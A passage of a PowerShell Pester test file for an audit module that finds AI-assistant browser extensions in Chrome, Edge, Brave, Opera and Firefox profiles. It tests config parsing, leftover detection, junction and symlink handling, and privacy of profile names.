    "browserExtensions": [ { "store": "chrome", "id": "$($CETestExtId.Claude)" } ] },
  { "id": "t-chatgpt", "name": "ChatGPT test", "service": "OpenAI (ChatGPT)", "canActOnDevice": false,
    "browserExtensions": [ { "store": "edge", "id": "$($CETestExtId.ChatGptEdge)" }, { "store": "chrome", "id": "$($CETestExtId.ChatGpt)" } ] },
  { "id": "t-wordtune", "name": "Wordtune test", "service": "Wordtune", "canActOnDevice": false,
    "browserExtensions": [ { "store": "firefox", "id": "support@wordtune.com" }, { "store": "firefox", "id": "x@y.xpix" } ] }
] }
"@
            # The browsers the fixtures use, with no 'installed' files, so nothing is labelled a leftover.
            $global:CETestBrowsers = @'
{ "maxProfilesPerBrowser": 64, "maxEntriesPerFolder": 2000, "windows": [
  { "name": "Google Chrome", "engine": "chromium", "root": "AppData\\Local\\Google\\Chrome\\User Data" },
  { "name": "Microsoft Edge", "engine": "chromium", "root": "AppData\\Local\\Microsoft\\Edge\\User Data" },
  { "name": "Brave", "engine": "chromium", "root": "AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data" },
  { "name": "Opera", "engine": "chromium", "root": "AppData\\Roaming\\Opera Software\\Opera Stable", "rootIsProfile": true },
  { "name": "Mozilla Firefox", "engine": "firefox", "root": "AppData\\Roaming\\Mozilla\\Firefox\\Profiles" }
] }
'@
            $global:CETestChromeData = 'AppData\Local\Google\Chrome\User Data'
            function global:Set-TestBrowserConfig {
                # Replaces ai-tools.json and/or browser-profiles.json (JSON text, parsed the way the module parses config files).
                param([string]$Tools, [string]$Browsers)
                InModuleScope CEAudit -Parameters @{ T = $Tools; B = $Browsers } {
                    param($T, $B)
                    if ($T) { (Get-CEConfig)['ai-tools'] = ($T | ConvertFrom-Json) }
                    if ($B) { (Get-CEConfig)['browser-profiles'] = ($B | ConvertFrom-Json) }
                }
            }
            function global:New-TestTree {
                # Folders under Root; paths ending in a file name (.xpi, .xpix, .exe, Preferences) become empty files.
                param([string]$Root, [string[]]$Paths)
                foreach ($rel in $Paths) {
                    $full = Join-Path $Root $rel
                    if ($rel -match '(\.xpix?|\.exe|\\Preferences)$') {
                        New-Item -ItemType Directory -Force -Path (Split-Path -Parent $full) | Out-Null
                        Set-Content -LiteralPath $full -Value '' -Encoding ASCII
                    }
                    else { New-Item -ItemType Directory -Force -Path $full | Out-Null }
                }
            }
            function global:Invoke-TestBrowserScan {
                # Get-CEAIToolStateUncached over a fixture profile; nothing else on this machine is looked at
                # (the Program Files variables point at an empty folder, see BeforeEach).
                # -System runs it as SYSTEM, -Elevated as an elevated user; neither is the user's own session.
                param([string]$ProfilePath, [switch]$System, [switch]$Elevated, [object[]]$Processes, [object[]]$Software, [string[]]$Store)
                $procs = if ($Processes) { @($Processes) } else { @() }
                $sw = if ($Software) { @($Software) } else { @() }
                $st = if ($Store) { @($Store) } else { @() }
                InModuleScope CEAudit -Parameters @{ P = $ProfilePath; S = [bool]$System; E = [bool]($System -or $Elevated); Pr = $procs; Sw = $sw; St = $st } {
                    param($P, $S, $E, $Pr, $Sw, $St)
                    $script:testBrowserProfile = $P
                    $script:testBrowserProcs = @($Pr | Where-Object { $null -ne $_ })
                    $script:testBrowserSoftware = @($Sw | Where-Object { $null -ne $_ })
                    $script:testBrowserStore = @($St | Where-Object { $_ })
                    Mock Get-CEUserProfilePath { $script:testBrowserProfile }
                    Mock Get-CEInstalledSoftware { $script:testBrowserSoftware }
                    Mock Get-CEStorePackageName { , $script:testBrowserStore }
                    Mock Get-CEVsCodeBuiltInExtensionDir { , @() }
                    Mock Get-CEProcessList { , $script:testBrowserProcs }
                    Get-CEAIToolStateUncached -Context ([pscustomobject]@{ IsSystem = $S; IsElevated = $E; ConsoleUserSid = 'S-1-5-21-1-2-3-1001' })
                }
            }
            function global:Get-TestBrowserMatch {
                # The collector on its own, for the ids in the current catalog. One output object per match.
                param([string]$ProfilePath)
                InModuleScope CEAudit -Parameters @{ P = $ProfilePath } {
                    param($P)
                    $catalog = Get-CEAIToolCatalog
                    $ids = Get-CEBrowserExtensionIdSet -Catalog $catalog
                    $m = Get-CEBrowserExtensionList -ProfilePath $P -ChromiumIds $ids.Chromium -FirefoxIds $ids.Firefox
                    $m
                }
            }
            function global:Get-TestToolById { param($State, [string]$Id) @($State.Tools | Where-Object { $_.Id -eq $Id }) }
            function global:Set-TestProgramFiles {
                # Program Files as the module sees it: ProgramW6432 is the 64-bit folder in 32-bit and 64-bit
                # processes alike; ProgramFiles is the x86 folder in a 32-bit process.
                param([string]$W6432, [string]$ProgramFiles, [string]$X86)
                foreach ($d in @($W6432, $ProgramFiles, $X86) | Where-Object { $_ }) { New-Item -ItemType Directory -Force -Path $d | Out-Null }
                $env:ProgramW6432 = $W6432
                $env:ProgramFiles = $ProgramFiles
                ${env:ProgramFiles(x86)} = $X86
            }
        }
        BeforeEach {
            # Browsers installed on this machine must not change a result, so Program Files starts empty.
            $global:CEOrigProgramFiles = @{ W6432 = $env:ProgramW6432; Pf = $env:ProgramFiles; X86 = ${env:ProgramFiles(x86)} }
            $none = Join-Path $TestDrive 'no-program-files'
            Set-TestProgramFiles -W6432 $none -ProgramFiles $none -X86 $none
        }
        AfterEach {
            $env:ProgramW6432 = $global:CEOrigProgramFiles.W6432
            $env:ProgramFiles = $global:CEOrigProgramFiles.Pf
            ${env:ProgramFiles(x86)} = $global:CEOrigProgramFiles.X86
            InModuleScope CEAudit -Parameters @{ O = $global:CEOrigBrowserConfig } {
                param($O)
                (Get-CEConfig)['ai-tools'] = $O.Tools
                (Get-CEConfig)['browser-profiles'] = $O.Browsers
            }
        }

        It 'the shipped browser profile list is well formed' {
            $list = Get-Content (Join-Path $script:RepoRoot 'config\browser-profiles.json') -Raw | ConvertFrom-Json
            $list.lastReviewed | Should -Match '^\d{4}-\d{2}-\d{2}$'
            "$($list.maxProfilesPerBrowser)" | Should -Match '^[1-9]\d*$'
            "$($list.maxEntriesPerFolder)" | Should -Match '^[1-9]\d*$'
            $names = @($list.windows | ForEach-Object { $_.name })
            $names.Count | Should -BeGreaterThan 0
            ($names | Sort-Object -Unique).Count | Should -Be $names.Count
            InModuleScope CEAudit -Parameters @{ L = $list } {
                param($L)
                foreach ($b in @($L.windows)) {
                    [string]$b.engine | Should -BeIn @('chromium', 'firefox') -Because $b.name
                    Test-CERelativePathText ([string]$b.root) | Should -BeTrue -Because "$($b.name) root"
                    $prop = $b.PSObject.Properties['installed']
                    foreach ($i in @(if ($prop -and $null -ne $prop.Value) { $prop.Value })) {
                        if ($i.PSObject.Properties['appx']) { [string]$i.appx | Should -Match '^[A-Za-z0-9][A-Za-z0-9.-]{0,63}$' -Because $b.name; continue }
                        [string]$i.base | Should -BeIn @('programFiles', 'programFilesX86', 'profile') -Because $b.name
                        Test-CERelativePathText ([string]$i.path) | Should -BeTrue -Because "$($b.name) installed path"
                    }
                }
                # The shipped file loads without anything being dropped.
                @((Get-CEBrowserProfileRoot).Browsers).Count | Should -Be @($L.windows).Count
            }
            foreach ($b in @($list.windows)) {
                $prop = $b.PSObject.Properties['installed']
                $inst = @(if ($prop -and $null -ne $prop.Value) { $prop.Value | Where-Object { $_.PSObject.Properties['base'] } })
                # A missing install place makes a live browser look uninstalled, and UA-07 then drops its services.
                foreach ($i in @($inst | Where-Object { $_.base -eq 'programFiles' })) {
                    @($inst | Where-Object { $_.base -eq 'programFilesX86' -and $_.path -eq $i.path }).Count | Should -Be 1 -Because "$($b.name) can also be installed in Program Files (x86)"
                }
            }
            $names | Should -Contain 'Opera Neon Developer'
            # A catalog 'paths' folder must not hold a browser's profiles: they stay after an uninstall, so the
            # browser would still be reported while its extensions say it is not installed.
            $tools = Get-Content (Join-Path $script:RepoRoot 'config\ai-tools.json') -Raw | ConvertFrom-Json
            $roots = @($list.windows | ForEach-Object { ([string]$_.root).ToLowerInvariant() })
            foreach ($t in @($tools.tools)) {
                $w = $t.PSObject.Properties['windows']
                if (-not $w -or $null -eq $w.Value -or -not $w.Value.PSObject.Properties['paths']) { continue }
                foreach ($rel in @($w.Value.paths)) {
                    InModuleScope CEAudit -Parameters @{ R = [string]$rel } { param($R) Test-CERelativePathText $R | Should -BeTrue -Because $R }
                    $l = ([string]$rel).ToLowerInvariant()
                    @($roots | Where-Object { $_ -eq $l -or $_.StartsWith("$l\") }).Count | Should -Be 0 -Because "$($t.id): $rel holds a browser's profiles"
                }
            }
        }

        It 'reads a partial browser-profiles.json override without failing' {
            foreach ($json in '{}', '{ "windows": [] }', '{ "windows": [ { "name": "Chrome", "engine": "chromium", "root": "AppData\\Local\\Google\\Chrome\\User Data" } ] }') {
                Set-TestBrowserConfig -Browsers $json
                $r = InModuleScope CEAudit { Get-CEBrowserProfileRoot }
                $r.MaxProfiles | Should -Be 64 -Because $json
                $r.MaxEntries | Should -Be 2000 -Because $json
            }
            @($r.Browsers).Count | Should -Be 1
            # Entries it can't use are dropped, not fatal.
            Set-TestBrowserConfig -Browsers '{ "maxProfilesPerBrowser": "lots", "maxEntriesPerFolder": 99999, "windows": [ { "name": "A", "engine": "gecko", "root": "x" }, { "name": "B", "engine": "chromium", "root": "..\\x" }, { "engine": "chromium", "root": "x" }, { "name": "C", "engine": "chromium", "root": "x", "installed": [ { "base": "windows", "path": "a.exe" }, { "base": "profile", "path": "C:\\a.exe" } ] } ] }'
            $r = InModuleScope CEAudit { Get-CEBrowserProfileRoot }
            @($r.Browsers | ForEach-Object Name) | Should -Be @('C')
            @($r.Browsers[0].Installed).Count | Should -Be 0
            $r.MaxProfiles | Should -Be 64
            $r.MaxEntries | Should -Be 10000
        }

        It 'finds AI browser extensions by folder name in Chromium and Firefox profiles' {
            $p = Join-Path $TestDrive 'bx-profile'
            New-TestTree $p @(
                "$CETestChromeData\Profile 1\Extensions\$($CETestExtId.Claude)\1.0.99_0",
                "$CETestChromeData\Profile 1\Extensions\$($CETestExtId.Claude)\1.0.100_0",
                "$CETestChromeData\Work Stuff\Extensions\$($CETestExtId.Claude)\2.0_0",
                "AppData\Local\Microsoft\Edge\User Data\Default\Extensions\$($CETestExtId.ChatGptEdge)\1.26.901.11451_0",
                "AppData\Local\Microsoft\Edge\User Data\Default\Extensions\$($CETestExtId.Other)\1.0_0",
                'AppData\Local\Microsoft\Edge\User Data\Default\Extensions\Temp',
                "AppData\Local\BraveSoftware\Brave-Browser\User Data\$($CETestExtId.ChatGpt)\1.0_0",
                "AppData\Roaming\Opera Software\Opera Stable\Extensions\$($CETestExtId.Claude)\1.0_0",
                'AppData\Roaming\Mozilla\Firefox\Profiles\ab12cd34.default-release\extensions\support@wordtune.com.xpi',
                'AppData\Roaming\Mozilla\Firefox\Profiles\ab12cd34.default-release\extensions\x@y.xpix',
                'AppData\Roaming\Mozilla\Firefox\Profiles\ab12cd34.Paul Work\extensions\support@wordtune.com.xpi')
            # A settings file holding a URL: it must never be opened.
            Set-Content -LiteralPath (Join-Path $p "$CETestChromeData\Profile 1\Preferences") -Value '{ "homepage": "https://secret.example/" }' -Encoding ASCII
            Set-TestBrowserConfig -Tools $CETestExtTools -Browsers $CETestBrowsers
            $st = Invoke-TestBrowserScan -ProfilePath $p
            @($st.NotRead).Count | Should -Be 0

            $claude = @(Get-TestToolById $st 't-claude')
            $claude.Count | Should -Be 1
            $claude[0].Signals | Should -Contain "Google Chrome extension: $($CETestExtId.Claude) 1.0.100 (profile: Profile 1)" -Because 'versions are compared as numbers, not by name'
            $claude[0].Signals | Should -Contain "Google Chrome extension: $($CETestExtId.Claude) 2.0 (profile: other)" -Because 'a profile folder name the person chose is never shown'
            $claude[0].Signals | Should -Contain "Opera extension: $($CETestExtId.Claude) 1.0 (profile: main)"
            $claude[0].LeftoverOnly | Should -BeFalse
            $claude[0].CanActOnDevice | Should -BeFalse

            $chatgpt = @(Get-TestToolById $st 't-chatgpt')
            @($chatgpt[0].Signals) | Should -Be @("Microsoft Edge extension: $($CETestExtId.ChatGptEdge) 1.26.901.11451 (profile: Default)") -Because 'a folder named like an id at the Brave root is not a profile'
            $chatgpt[0].Signals.GetType().IsArray | Should -BeTrue -Because 'one signal is still a list on Windows PowerShell 5.1'

            $wordtune = @(Get-TestToolById $st 't-wordtune')
            @($wordtune[0].Signals).Count | Should -Be 2
            @($wordtune[0].Signals) | Should -Contain 'Mozilla Firefox add-on: support@wordtune.com (profile: default-release)'
            @($wordtune[0].Signals) | Should -Contain 'Mozilla Firefox add-on: support@wordtune.com (profile: other)'

            $all = @($st.Tools | ForEach-Object { $_.Signals }) -join "`n"
            $all | Should -Not -Match 'x@y' -Because '*.xpi also matches .xpix on Windows PowerShell 5.1, and that is filtered out'
            $all | Should -Not -Match 'secret\.example'
            $all | Should -Not -Match 'Work Stuff|Paul Work'
            @(Get-TestBrowserMatch $p | Where-Object { $_.Id -eq $CETestExtId.Other }).Count | Should -Be 0 -Because 'only ids in the catalog are returned'
        }

        It 'labels matches from an uninstalled browser as a leftover, and changes the advice' {
            $p = Join-Path $TestDrive 'bx-leftover'
            New-TestTree $p @("$CETestChromeData\Profile 1\Extensions\$($CETestExtId.Claude)\1.0.94_0")
            Set-TestBrowserConfig -Tools $CETestExtTools -Browsers @'
{ "windows": [ { "name": "Google Chrome", "engine": "chromium", "root": "AppData\\Local\\Google\\Chrome\\User Data",
  "installed": [ { "base": "profile", "path": "AppData\\Local\\Google\\Chrome\\Application\\chrome.exe" } ] } ] }
'@
            $claude = @(Get-TestToolById (Invoke-TestBrowserScan -ProfilePath $p) 't-claude')
            @($claude[0].Signals) | Should -Be @("Google Chrome extension: $($CETestExtId.Claude) 1.0.94 (profile: Profile 1; leftover: Google Chrome is not installed)")
            $claude[0].LeftoverOnly | Should -BeTrue

            New-TestTree $p @('AppData\Local\Google\Chrome\Application\chrome.exe')
            $claude = @(Get-TestToolById (Invoke-TestBrowserScan -ProfilePath $p) 't-claude')
            @($claude[0].Signals) | Should -Be @("Google Chrome extension: $($CETestExtId.Claude) 1.0.94 (profile: Profile 1)")
            $claude[0].LeftoverOnly | Should -BeFalse

            $leftover = New-TestAITool 'Old Extension' -Service 'X' -CanAct $false -Id 't-claude'
            $leftover | Add-Member -NotePropertyName LeftoverOnly -NotePropertyValue $true
            Set-TestAITools -Tools @($leftover, (New-TestAITool 'Cursor' -Service 'Cursor'))
            $ai = InModuleScope CEAudit { Get-CEAiPosture -Context (Get-CEDeviceContext) }
            @($ai.agents | Where-Object { $_.leftoverOnly } | ForEach-Object { $_.name }) | Should -Be @('Old Extension')
            $r = Export-CEReport -Findings @(Invoke-CEAuditCore -Id 'SC-09') -Context (New-TestContext) -OutputPath (Join-Path $TestDrive 'leftover-report')
            (Get-Content $r.Paths.Markdown -Raw) | Should -Match ([regex]::Escape('- Old Extension - only in the profile folder of a browser that is no longer installed'))
            (Get-Content $r.Paths.Markdown -Raw) | Should -Match ([regex]::Escape('- Cursor - present'))
            $mfa = @(Invoke-CEAuditCore -Id 'UA-07')
            @($mfa | Where-Object Subject -eq 'X').Count | Should -Be 0 -Because 'a leftover profile does not show the service is in use'
            @($mfa | Where-Object Subject -eq 'Cursor').Count | Should -Be 1
        }

        It 'does not call a tool a leftover when it is also found another way or is running' {
            $p = Join-Path $TestDrive 'bx-leftover-both'
            New-TestTree $p @("$CETestChromeData\Profile 1\Extensions\$($CETestExtId.Claude)\1.0.94_0")
            # An override that joins a desktop app with its browser extension; Chrome is not installed.
            Set-TestBrowserConfig -Tools @"
{ "schemaVersion": 2, "tools": [ { "id": "t-both", "name": "Both test", "service": "Both", "canActOnDevice": false,
  "windows": { "paths": [ ".bothtool" ], "processes": [ { "image": "bothtool.exe" } ] },
  "browserExtensions": [ { "store": "chrome", "id": "$($CETestExtId.Claude)" } ] } ] }
"@ -Browsers @'
{ "windows": [ { "name": "Google Chrome", "engine": "chromium", "root": "AppData\\Local\\Google\\Chrome\\User Data",
  "installed": [ { "base": "profile", "path": "AppData\\Local\\Google\\Chrome\\Application\\chrome.exe" } ] } ] }
'@
            @(Get-TestToolById (Invoke-TestBrowserScan -ProfilePath $p) 't-both')[0].LeftoverOnly | Should -BeTrue -Because 'the extension is its only signal'

            $run = [pscustomobject]@{ Name = 'bothtool.exe'; ProcessId = 4242; Path = 'C:\Apps\bothtool.exe'; CommandLine = 'bothtool'; Cim = $null }
            $both = @(Get-TestToolById (Invoke-TestBrowserScan -ProfilePath $p -Processes @($run)) 't-both')
            $both[0].LeftoverOnly | Should -BeFalse -Because 'the tool is running'
            $both[0].Signals | Should -Contain 'Running: bothtool.exe (pid 4242)'

            New-TestTree $p @('.bothtool')
            $both = @(Get-TestToolById (Invoke-TestBrowserScan -ProfilePath $p) 't-both')
            $both[0].LeftoverOnly | Should -BeFalse -Because 'its profile folder is there too'
            $both[0].Signals | Should -Contain 'Found %USERPROFILE%\.bothtool'
        }

        It 'the browser extension collector reads folder and file names only' {
            InModuleScope CEAudit {
                $names = 'Get-CEBrowserExtensionList', 'Get-CEProfileChildName', 'Get-CEChromiumExtensionVersion', 'Test-CEProfileItem', 'Get-CEPathChainProblem',
                    'Test-CERelativePathText', 'Get-CEBrowserProfileLabel', 'Get-CEBrowserExtensionIdSet', 'Test-CEFirefoxAddonId', 'Test-CEBrowserInstalled',
                    'Get-CEBrowserProfileRoot', 'Format-CEBrowserExtensionEvidence', 'ConvertTo-CEBoundedInt', 'Get-CEProgramFilesPath', 'Test-CEProfileReady',
                    'Get-CEReparseKind', 'Get-CEReparseTag', 'Get-CEJunctionProblem', 'Add-CENotRead', 'Get-CENotReadReason', 'Get-CEProfileLocation'
                $text = @($names | ForEach-Object { (Get-Command $_ -CommandType Function).ScriptBlock.ToString() }) -join "`n"
                $text | Should -Not -Match 'Get-Content|ReadAll|OpenRead|OpenText|OpenWrite|StreamReader|FileStream|\.Open\(|ConvertFrom-Json|Import-Csv|Select-String|Get-Item|Get-ChildItem|Test-Path|Resolve-Path|Registry|Invoke-CENative|Invoke-Expression|Start-Process|-Recurse|\[IO\.File\]|&\s*\$'
                # Listings stay lazy: routing the enumerable through an 'if' expression would read the whole folder first.
                $list = (Get-Command Get-CEProfileChildName -CommandType Function).ScriptBlock.ToString()
                $list | Should -Match '\$items = \$di\.EnumerateFiles'
                $list | Should -Match '\$items = \$di\.EnumerateDirectories'
                $list | Should -Not -Match '=\s*if\s*\('
            }
        }

        It 'lists browser extensions through a junction whose target it has checked, and not through a symbolic link' {
            Use-TestTags   # the junctions' targets are walked from the drive root: TEMP's ancestors count as plain
            Set-TestBrowserConfig -Tools $CETestExtTools -Browsers $CETestBrowsers
            $links = New-Object System.Collections.ArrayList
            try {
                $ext = "Extensions\$($CETestExtId.Claude)\1.0_0"
                $case = {
                    # A profile, a target outside it holding a Chrome extension, and the link between them.
                    param([string]$Name, [string]$Plain, [string]$Link, [string]$TargetTree)
                    $root = Join-Path $TestDrive "bx-junction-$Name"
                    New-TestTree (Join-Path $root 'profile') @($Plain)
                    New-TestTree (Join-Path $root 'target') @($TargetTree)
                    $l = Join-Path (Join-Path $root 'profile') $Link
                    New-Item -ItemType Junction -Path $l -Target (Join-Path $root 'target') | Out-Null
                    [void]$links.Add($l)
                    return (Join-Path $root 'profile')
                }
                $cases = [ordered]@{
                    'a profile'          = & $case 'a' "$CETestChromeData\Profile 1" "$CETestChromeData\Profile 2" $ext
                    'the browser folder' = & $case 'b' 'AppData\Local\Google' 'AppData\Local\Google\Chrome' "User Data\Profile 1\$ext"
                    'Extensions'         = & $case 'c' "$CETestChromeData\Profile 1" "$CETestChromeData\Profile 1\Extensions" "$($CETestExtId.Claude)\1.0_0"
                    'an extension'       = & $case 'd' "$CETestChromeData\Profile 1\Extensions" "$CETestChromeData\Profile 1\Extensions\$($CETestExtId.Claude)" '1.0_0'
                }
                # A junction's target is read without following it, and it is on this computer: names are listed through it.
                foreach ($k in $cases.Keys) {
                    $m = @(Get-TestBrowserMatch $cases[$k])
                    $m.Count | Should -Be 1 -Because "$k is a junction to a local folder"
                    $m[0].Version | Should -Be '1.0' -Because $k
                }
                # A symbolic link could point off this computer: it is not followed, and what it hides is recorded.
                Use-TestSymlinkTag -Paths @($links)
                foreach ($k in 'a profile', 'the browser folder', 'Extensions') {
                    @(Get-TestBrowserMatch $cases[$k]).Count | Should -Be 0 -Because "$k is a symbolic link"
                    $st = Invoke-TestBrowserScan -ProfilePath $cases[$k] -Elevated
                    @($st.NotRead | Where-Object { $_.Topic -eq 'browser' -and $_.NeedsUserSession }).Count | Should -Be 1 -Because "$k is recorded"
                    @($st.NotRead | ForEach-Object { $_.Location }) -join '|' | Should -Not -Match 'bx-junction|[A-Za-z]:\\' -Because 'a location never shows the absolute path'
                }
                # An extension folder that is a link still counts by its name; only its version, read by going into it, is not.
                $m = @(Get-TestBrowserMatch $cases['an extension'])
                $m.Count | Should -Be 1
                $m[0].Version | Should -Be ''
                $st = Invoke-TestBrowserScan -ProfilePath $cases['an extension'] -Elevated
                @($st.NotRead | ForEach-Object { "$($_.Topic)|$($_.Location)" }) | Should -Be @("extension-version|%USERPROFILE%\$CETestChromeData\Profile 1\Extensions\$($CETestExtId.Claude)")
                # The profile folder itself may be a link (profile containers, moved profiles): that one is followed.
                $real = Join-Path $TestDrive 'bx-junction-e\real'
                New-TestTree $real @("$CETestChromeData\Profile 1\$ext")
                $viaLink = Join-Path $TestDrive 'bx-junction-e\profile'
                New-Item -ItemType Junction -Path $viaLink -Target $real | Out-Null
                [void]$links.Add($viaLink)
                Use-TestSymlinkTag -Paths @($viaLink)
                $m = @(Get-TestBrowserMatch $viaLink)
                $m.Count | Should -Be 1
                $m[0].Profile | Should -Be 'Profile 1'
            }
            finally {
                # Remove the links themselves, never what they point to.
                foreach ($l in $links) { if ([IO.Directory]::Exists($l)) { [IO.Directory]::Delete($l) } }
            }
        }

        It 'looks for browser extensions through a cloud-synced folder, a reparse point that is not a link' {
            # Every folder under a OneDrive or Proton Drive sync root is a reparse point with a cloud tag.
            # A test can't make one, so junctions stand in for them, with Get-CEReparseTag giving their tag.
            Set-TestBrowserConfig -Tools $CETestExtTools -Browsers $CETestBrowsers
            $root = Join-Path $TestDrive 'bx-cloudfolder'
            $p = Join-Path $root 'profile'
            New-TestTree $p @('AppData\Local\Google')
            New-TestTree (Join-Path $root 'chrome') @("User Data\Profile 1\Extensions\$($CETestExtId.Claude)\1.0_0")
            New-TestTree (Join-Path $root 'profile2') @("Extensions\$($CETestExtId.Claude)\2.0_0")
            $chrome = Join-Path $p 'AppData\Local\Google\Chrome'
            $profile2 = Join-Path $root 'chrome\User Data\Profile 2'
            New-Item -ItemType Junction -Path $chrome -Target (Join-Path $root 'chrome') | Out-Null
            New-Item -ItemType Junction -Path $profile2 -Target (Join-Path $root 'profile2') | Out-Null
            # Only the two stand-ins get the tag: TestDrive and the folders above it, which the junctions' targets are
            # walked through from the drive root, count as plain folders (Use-TestTags).
            $as = { param([string]$Hex) Use-TestTags @{ $chrome = [Convert]::ToInt64($Hex, 16); $profile2 = [Convert]::ToInt64($Hex, 16) } }
            try {
                & $as '9000601A'
                $claude = @(Get-TestToolById (Invoke-TestBrowserScan -ProfilePath $p -Elevated) 't-claude')
                $claude.Count | Should -Be 1
                @($claude[0].Signals | Sort-Object) | Should -Be @(
                    "Google Chrome extension: $($CETestExtId.Claude) 1.0 (profile: Profile 1)",
                    "Google Chrome extension: $($CETestExtId.Claude) 2.0 (profile: Profile 2)")
                # The same folders as junctions to local folders are followed for names too, once their targets are checked.
                & $as 'A0000003'
                $st = Invoke-TestBrowserScan -ProfilePath $p -Elevated
                @(Get-TestToolById $st 't-claude')[0].Signals.Count | Should -Be 2
                @($st.NotRead).Count | Should -Be 0
                # As symbolic links they are not.
                & $as 'A000000C'
                $st = Invoke-TestBrowserScan -ProfilePath $p -Elevated
                @(Get-TestToolById $st 't-claude').Count | Should -Be 0
                @($st.NotRead | ForEach-Object { $_.Location }) | Should -Be @('%USERPROFILE%\AppData\Local\Google\Chrome\User Data')
            }
            finally {
                foreach ($l in @($profile2, $chrome)) { if ([IO.Directory]::Exists($l)) { [IO.Directory]::Delete($l) } }
            }
        }

        It 'knows a browser is installed from Program Files and Program Files (x86)' {
            $p = Join-Path $TestDrive 'bx-programfiles'
            New-TestTree $p @("$CETestChromeData\Default\Extensions\$($CETestExtId.Claude)\1.0_0",
                "AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Extensions\$($CETestExtId.ChatGpt)\1.0_0",
                "AppData\Local\Microsoft\Edge\User Data\Default\Extensions\$($CETestExtId.ChatGptEdge)\1.0_0")
            $pf = Join-Path $TestDrive 'bx-pf'
            $pfx = Join-Path $TestDrive 'bx-pfx86'
            New-TestTree $pf @('Google\Chrome\Application\chrome.exe')
            New-TestTree $pfx @('BraveSoftware\Brave-Browser\Application\brave.exe')
            Set-TestBrowserConfig -Tools $CETestExtTools -Browsers @'
{ "windows": [
  { "name": "Google Chrome", "engine": "chromium", "root": "AppData\\Local\\Google\\Chrome\\User Data", "installed": [ { "base": "programFiles", "path": "Google\\Chrome\\Application\\chrome.exe" } ] },
  { "name": "Brave", "engine": "chromium", "root": "AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data", "installed": [ { "base": "programFiles", "path": "BraveSoftware\\Brave-Browser\\Application\\brave.exe" }, { "base": "programFilesX86", "path": "BraveSoftware\\Brave-Browser\\Application\\brave.exe" } ] },
  { "name": "Microsoft Edge", "engine": "chromium", "root": "AppData\\Local\\Microsoft\\Edge\\User Data", "installed": [ { "base": "programFiles", "path": "Microsoft\\Edge\\Application\\msedge.exe" }, { "base": "programFilesX86", "path": "Microsoft\\Edge\\Application\\msedge.exe" } ] }
] }
'@
            Set-TestProgramFiles -W6432 $pf -ProgramFiles $pf -X86 $pfx
            $m = @(Get-TestBrowserMatch $p)
            $found = @{}
            foreach ($x in $m) { $found[$x.Browser] = $x.BrowserFound }
            $found['Google Chrome'] | Should -BeTrue -Because 'chrome.exe is in Program Files'
            $found['Brave'] | Should -BeTrue -Because 'brave.exe is in Program Files (x86)'
            $found['Microsoft Edge'] | Should -BeFalse -Because 'msedge.exe is in neither'

            # In a 32-bit PowerShell, ProgramFiles names the x86 folder; the 64-bit one is still looked in.
            Set-TestProgramFiles -W6432 $pf -ProgramFiles $pfx -X86 $pfx
            $m = @(Get-TestBrowserMatch $p)
            @($m | Where-Object { $_.Browser -eq 'Google Chrome' })[0].BrowserFound | Should -BeTrue -Because 'a 32-bit host still finds 64-bit Chrome'
            InModuleScope CEAudit -Parameters @{ Pf = $pf; Pfx = $pfx } {
                param($Pf, $Pfx)
                Get-CEProgramFilesPath 'programFiles' | Should -Be $Pf
                Get-CEProgramFilesPath 'programFilesX86' | Should -Be $Pfx
                Get-CEProgramFilesPath 'profile' | Should -Be ''
                $env:ProgramW6432 = $null
                Get-CEProgramFilesPath 'programFiles' | Should -Be $Pfx -Because 'without ProgramW6432 (32-bit Windows) ProgramFiles is used'
            }
        }

        It 'knows Firefox is installed when only Developer Edition or Nightly is' {
            # Every Firefox edition keeps its profiles in the same folder, so an add-on in a Developer Edition
            # profile must not be called a leftover of release Firefox.
            $p = Join-Path $TestDrive 'bx-firefox-dev'
            New-TestTree $p @('AppData\Roaming\Mozilla\Firefox\Profiles\ab12cd34.dev-edition-default\extensions\support@wordtune.com.xpi')
            Set-TestBrowserConfig -Tools (Get-Content (Join-Path $script:RepoRoot 'config\ai-tools.json') -Raw) -Browsers (Get-Content (Join-Path $script:RepoRoot 'config\browser-profiles.json') -Raw)
            $tool = @(Get-TestToolById (Invoke-TestBrowserScan -ProfilePath $p) 'wordtune-extension')
            $tool[0].LeftoverOnly | Should -BeTrue -Because 'no Firefox edition is installed yet'

            $cases = @{
                'Developer Edition in Program Files'         = @{ Base = 'W6432'; Path = 'Firefox Developer Edition\firefox.exe' }
                'Nightly in Program Files (x86)'             = @{ Base = 'X86'; Path = 'Firefox Nightly\firefox.exe' }
                'an older Nightly in Program Files'          = @{ Base = 'W6432'; Path = 'Nightly\firefox.exe' }
                'Developer Edition installed for one person' = @{ Base = 'Profile'; Path = 'AppData\Local\Firefox Developer Edition\firefox.exe' }
            }
            $i = 0
            foreach ($k in $cases.Keys) {
                $i++
                $pf = Join-Path $TestDrive "bx-ff-pf$i"
                $pfx = Join-Path $TestDrive "bx-ff-pfx$i"
                Set-TestProgramFiles -W6432 $pf -ProgramFiles $pf -X86 $pfx
                $q = Join-Path $TestDrive "bx-ff-profile$i"
                New-TestTree $q @('AppData\Roaming\Mozilla\Firefox\Profiles\ab12cd34.dev-edition-default\extensions\support@wordtune.com.xpi')
                $base = switch ($cases[$k].Base) { 'W6432' { $pf } 'X86' { $pfx } default { $q } }
                New-TestTree $base @($cases[$k].Path)
                $tool = @(Get-TestToolById (Invoke-TestBrowserScan -ProfilePath $q) 'wordtune-extension')
                $tool[0].LeftoverOnly | Should -BeFalse -Because $k
                @($tool[0].Signals) | Should -Be @('Mozilla Firefox add-on: support@wordtune.com (profile: dev-edition-default)') -Because $k
            }
        }

        It 'knows Firefox from the Microsoft Store is installed when it uses the usual profile folder' {
            # The Store app keeps its profiles in %APPDATA%\Mozilla\Firefox and has no firefox.exe in Program Files.
            $p = Join-Path $TestDrive 'bx-firefox-store'
            New-TestTree $p @('AppData\Roaming\Mozilla\Firefox\Profiles\ab12cd34.default-release\extensions\support@wordtune.com.xpi')
            Set-TestBrowserConfig -Tools (Get-Content (Join-Path $script:RepoRoot 'config\ai-tools.json') -Raw) -Browsers (Get-Content (Join-Path $script:RepoRoot 'config\browser-profiles.json') -Raw)
            $tool = @(Get-TestToolById (Invoke-TestBrowserScan -ProfilePath $p) 'wordtune-extension')
            $tool[0].LeftoverOnly | Should -BeTrue -Because 'no Firefox is installed'
